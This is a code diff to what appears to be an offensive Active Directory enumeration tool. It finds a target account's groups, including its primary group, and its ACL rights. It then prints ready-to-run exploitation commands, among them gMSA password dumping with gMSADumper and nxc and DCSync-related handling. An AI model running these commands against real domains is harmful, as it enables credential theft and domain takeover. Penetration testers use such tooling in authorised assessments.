@@ -65,6 +65,39 @@ def users_to_groups(conn, base_dn, username):
     groups = [str(entry.distinguishedName) for entry in conn.entries]
     return groups
 
+def get_primary_group(conn, base_dn, victim_sid, user_entry):
+    """Resolve the victim's primary group (primaryGroupID).
+
+    memberOf / the member matching-rule never include the primary group, but
+    BloodHound treats it as real membership (e.g. computers -> Domain
+    Computers, RID 515). Without it we miss ACLs granted to Domain Computers,
+    such as ReadGMSAPassword on gMSA accounts.
+    Returns (sid, name) or None.
+    """
+    try:
+        pgid = None
+        try:
+            # ldap3 raises LDAPAttributeError (not AttributeError) for missing attrs,
+            # so plain hasattr() is unreliable here
+            pgid = user_entry['primaryGroupID'].value
+        except Exception:
+            return None
+        pgid = int(pgid)
+        domain_sid = victim_sid.rsplit('-', 1)[0]
+        pg_sid = f"{domain_sid}-{pgid}"
+        name = None
+        try:
+            conn.search(base_dn, f'(objectSid={pg_sid})', attributes=['sAMAccountName'])
+            if conn.entries:
+                name = str(conn.entries[0].sAMAccountName)
+        except Exception:
+            pass
+        if not name:
+            name = f"RID-{pgid} (primary group)"
+        return pg_sid, name
+    except Exception:
+        return None
+
 def get_groups_sids(conn, base_dn, group_dns):
     groups_sids = {}
 
@@ -160,7 +193,9 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             #hints.append(("Add Member to Group (GenericWrite)", f"impacket-net group '{target}' {current_user} -add -domain -dc-ip {dc_ip}"))
     elif "ReadGmsaPassword" in right:
         #hints.append(("Read GMSA Password (Option A)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} get gmsaPassword {target}"))
-        hints.append(("Read GMSA Password (Option B)", f"nxc ldap {dc_fqdn} -u {current_user} -p {current_auth} --gmsa"))
+        hints.append(("Read GMSA Password (built-in)", f"getgmsa {target}   # inside this ldap shell (tries Kerberos/LDAPS, then nxc)"))
+        hints.append(("Read GMSA Password (gMSADumper)", f"python3 gMSADumper.py -u '{current_user}' -p '{current_auth}' -l {dc_fqdn} -d {domain}"))
+        hints.append(("Read GMSA Password (Option B)", f"nxc ldap {dc_fqdn} -u {current_user} -p {current_auth} -d {domain} --gmsa"))
     elif right == "DS-Replication-Get-Changes" or right == "DS-Replication-Get-Changes-All":
         target_string = f"'{domain}/{current_user}@{dc_ip}'" if is_hash else f"'{domain}/{current_user}:{current_auth}@{dc_ip}'"
         hash_arg = f" -hashes :{current_auth}" if is_hash else ""
@@ -282,16 +317,22 @@ def main(args=None):
     if not dc_fqdn:
         dc_fqdn = args.dc_ip
 
-    conn.search(base_dn, f'(sAMAccountName={args.username})', attributes=['objectSid'])
+    conn.search(base_dn, f'(sAMAccountName={args.username})', attributes=['objectSid', 'primaryGroupID'])
 
     if not conn.entries:
         console.print(f"[bold red][-] Could not find: {args.username}[/bold red]")
         return
 
-    victim_sid = LDAP_SID(conn.entries[0].objectSid.raw_values[0]).formatCanonical()
+    # conn.entries gets overwritten by every later search -> keep a reference
+    victim_entry = conn.entries[0]
+    victim_sid = LDAP_SID(victim_entry.objectSid.raw_values[0]).formatCanonical()
 
     victim_groups = users_to_groups(conn, base_dn, args.username)
     groups_sids = get_groups_sids(conn, base_dn, victim_groups)
+
+    primary_group = get_primary_group(conn, base_dn, victim_sid, victim_entry)
+    if primary_group and primary_group[0] not in groups_sids:
+        groups_sids[primary_group[0]] = primary_group[1]
 
     group_tree = Tree(f"[bold blue]Groups for {args.username}[/bold blue]", guide_style="bold bright_black")
     for sid, name in groups_sids.items():
